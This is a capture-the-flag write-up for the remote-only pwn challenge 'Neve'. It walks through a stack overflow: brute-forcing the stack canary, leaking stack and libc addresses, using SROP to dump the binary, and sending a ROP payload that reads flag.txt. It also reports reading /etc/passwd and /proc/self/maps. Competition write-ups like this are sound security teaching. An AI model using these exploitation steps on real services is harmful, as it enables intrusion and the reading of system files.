---
title: "Neve"
description: "The service only exposed a TCP endpoint, no binary was provided. It prints:"
event: "cryovault"
category: "pwn"
categoryLabel: "Pwn"
tags: ["ISFCR CryoVault Finals 2026","pwn"]
date: "2026-10-26"
teammate: false
source: "cryovault/pwn/3/writeup.md"
---

**Category:** Pwn (blind / remote-only)  
**Target:** `nc 0.cloud.chals.io 18435`  
**Flag:** `isfcr{wr1t3_wh4t_wh3r3_pl4nt_p4th_b4_0p3n_n3v3}`

## Overview

The service only exposed a TCP endpoint, no binary was provided. It prints:

```text
neve relay up.
neve> 
```

`neve` is a sibling of `floe`, `blizzard`, and `drif`. The protocol is a
two-byte big-endian length followed by that many payload bytes:

```text
send: 00 05 "hello"
recv: relayed 5.
      neve> 
```

A normal frame is copied into an 88-byte stack buffer without a length check,
so this is a stack overflow behind a stack canary.

## Recovered stack layout

| Payload offset | Contents |
| ---: | --- |
| 0–87 | frame buffer |
| 88–95 | stack canary |
| 96–111 | padding |
| 112–115 | live client fd (`4`), preserved as saved RBP |
| 116–135 | padding |
| 136–143 | saved return address |
| 144+ | ROP chain / stack-leak area |

The canary is stable across forked children but rotates when the parent
service restarts. It was recovered byte-by-byte with the usual oracle:
`88*A + known_prefix + guess` keeps the prompt alive only for the correct next
byte. At solve time it was:

```text
007eecaccb046db8
```

## Stack/libc leak

Scanning return targets found two useful entry points inside the file reader:

- `0x4006b2` / `0x4006b3` — reaches `write(fd, rsp, rax)`, leaking the stack.
- `0x4006ee` — does the same after `mov rsi, rsp`.
- `0x4006f1` — leaks from the frame buffer instead (leftover `rsi`).

With a 400-byte frame, the leak begins at `buffer + 144`. A qword on the
leaked stack gives the original `buffer` address; the leaked libc return
`0x...628b` is `__libc_start_call_main+0x8b` in Ubuntu 24.04 / glibc 2.39:

```python
libc_base = libc_ret - 0x2A28B
buffer    = leaked_stack_ptr - 0x220
```

The leak was also enough to identify the libc, then SROP (`pop rax; ret`,
`rax = 15`, `syscall`) was used to dump the first `0x4000` bytes of the remote
ELF into `neve_dump.bin`.

## Reversing the dump

The binary is a non-PIE, stripped ELF based at `0x400000`. Important offsets:

```text
0x400570  pop rdi ; ret
0x400572  pop rsi ; ret
0x400574  mov [rdi], rsi ; ret
0x400670  open(path, 0) / read(fd, rsp, 0x100) / write(socket, rsp, n)
0x4006b2  stack-leak path inside the file reader
0x4006f1  buffer-leak path
0x400710  framed read routine
0x400800  per-connection server loop
```

The file reader at `0x400670` takes the pathname in `rdi`. Strings in the
binary are only explicit decoys:

```text
isfcr{sw33p_d3c0y_n3v3_a1}
isfcr{n0_4rg_d3c0y_n3v3_b2}
isfcr{pl4nt_d3c0y_n3v3_c3}
```

Calling it with `/etc/passwd`, `/proc/self/maps`, and `/proc/self/exe`
succeeded, confirming it is a real `open/read/write` primitive. The real flag
was in the relative file `flag.txt`.

## Final exploit

The pathname is placed at the start of the stack buffer. The leak provides the
absolute buffer address, so `pop rdi` points the file reader at `"flag.txt"`:

```python
path = b"flag.txt\0".ljust(88, b"A")
payload  = path + canary + b"\0"*16 + struct.pack("<I", 4) + b"\0"*20
payload += p64(0x400570)   # pop rdi ; ret
payload += p64(buffer)     # -> "flag.txt"
payload += p64(0x400670)   # open/read/send
payload += p64(0x400580)   # clean decoy return
```

Output:

```text
isfcr{wr1t3_wh4t_wh3r3_pl4nt_p4th_b4_0p3n_n3v3}
```

The working files are:

- `brute_canary.py` — canary recovery with the framed oracle
- `scan_output.py` — return-target/output scanner
- `srop_dump.py` — libc leak + SROP binary dump
- `neve_dump.bin` — leaked remote ELF
- `exploit_neve.py` — final exploit
